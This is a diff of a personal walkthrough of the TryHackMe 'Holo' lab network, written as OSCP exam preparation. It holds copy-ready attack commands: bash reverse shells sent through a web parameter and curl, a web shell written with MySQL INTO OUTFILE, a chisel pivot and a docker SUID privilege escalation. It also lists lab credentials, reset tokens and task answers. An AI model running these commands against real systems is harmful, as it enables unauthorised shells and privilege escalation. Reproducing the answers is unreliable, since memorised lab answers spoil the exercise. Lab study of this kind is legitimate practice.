@@ -16,7 +16,9 @@ Learnt:
 
 Returning to this after lots of Hack the Box I decided to follow along with [Alh4zr3d](https://www.youtube.com/watch?v=PqnnKMU3XMk) purely to fit with my work schedule that include another siz hours plus after this. I need mentorship and I need practical experience that is less-head-smashing-problem-solving-stress to pace out the the marathon of learning everything for the exam I need. Some humor and Cthulu mythos is great addition to my day. It was very enjoyable to do this this way. I learnt alot and loads of fun.
 
-Tasks 0 - 21 [Part 1](https://www.youtube.com/watch?v=PqnnKMU3XMk)
+Tasks 0 - 21 [Part 1 Alh4zr3d](https://www.youtube.com/watch?v=PqnnKMU3XMk)
+Task 22 -  [Part 2 from 1:53:00 Alh4zr3d](https://www.youtube.com/watch?v=-a10dxWbp5M)
+
 
 ## Initial Recon
 
@@ -265,8 +267,12 @@ linux-admin
 
 ## To Get Here
 
-
 ```bash
+# login in to 
+http://admin.holo.live/index.php
+# admin:DBManagerLogin!
+http://admin.holo.live/dashboard.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.103.91/443+<%261'
+
 # Setup proxychains and chisel
 ./chisel server -p 8888 --reverse
 # curl chisel run client 
@@ -277,11 +283,89 @@ proxychains mysql -h 192.168.100.1 -u admin -p
 # !123SecureAdminDashboard321!
 use DashboardDB;
 # required create RCE on docker host
+# if it does not exist
 select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/nvmcmd.php';
 
-proxychains curl "http://192.168.100.1:8080/shell.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.103.91/445+<%261'"
+proxychains curl "http://192.168.100.1:8080/nvmcmd.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.103.91/445+<%261'"
 
 sudo install -m =xs $(which docker) .
 ./docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
 
 ```
+
+[From 1:30:00 Alh4zr3d](https://www.youtube.com/watch?v=-a10dxWbp5M)
+
+#### Task 22
+
+The /etc/shadow has vandalised or broken so I could not crack it
+```
+linuxrulez
+```
+
+#### Task 23 - 28
+
+```lua
+Nmap scan report for 10.200.107.31
+Host is up (0.21s latency).
+Not shown: 92 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql
+3389/tcp open  ms-wbt-server
+```
+
+```
+DBManagerLogin!
+!123SecureAdminDashboard321!
+```
+
+reset for admin: 
+```
+b69a9e454439e1316427e518adcd887c38e8d0bbaebbdaf4831daf99431f698d93a3142e87eaca7ad4b315d18be7b0019d02
+```
+
+reset for gurag: 
+```
+09f7ab735e40f816e5913df5e157a0b271d1fd8c3665986bc782485322f06ee1fd2b5c5420594171050047280da9fcdeb80e
+```
+
+Set in the url to the `user_token=`  on requesting gurag password. Apparently very unrealistic reset password functionality. I have tried reset password testing on CTFs and there never has been one on all the machines I have done so far. Putting it on the CTFs lokup list
+
+What user can we control for a password reset on S-SRV01?
+```
+gurag
+```
+What is the name of the cookie intercepted on S-SRV01?
+```
+user_token
+```
+What is the size of the cookie intercepted on S-SRV01?
+```
+110
+```
+What page does the reset redirect you to when successfully authenticated on S-SRV01?
+```
+reset.php
+```
+
+#### Task 29
+
+Thankfully Al uses Empire for the stream so my OSCP preparation continue to press on in a fun manner. 
+https://learn.microsoft.com/en-us/dotnet/core/install/linux-debian
+https://bc-security.gitbook.io/empire-wiki/quickstart/installation
+Remember to consider the use of telemetry that comes with .NET by opting out with environment variables. 
+
+gurag : password
+
+linux-admin linuxrulez
+
+![](images.png)
+
+I wondered what was going on, I cant get execution but AV is actually removing it. As much as I have enjoyed the stream I will return to this probably in two days time after I have read everything in the next couple of sections as there is some divergence of path 
+
+[2:57:02](https://www.youtube.com/watch?v=-a10dxWbp5M)
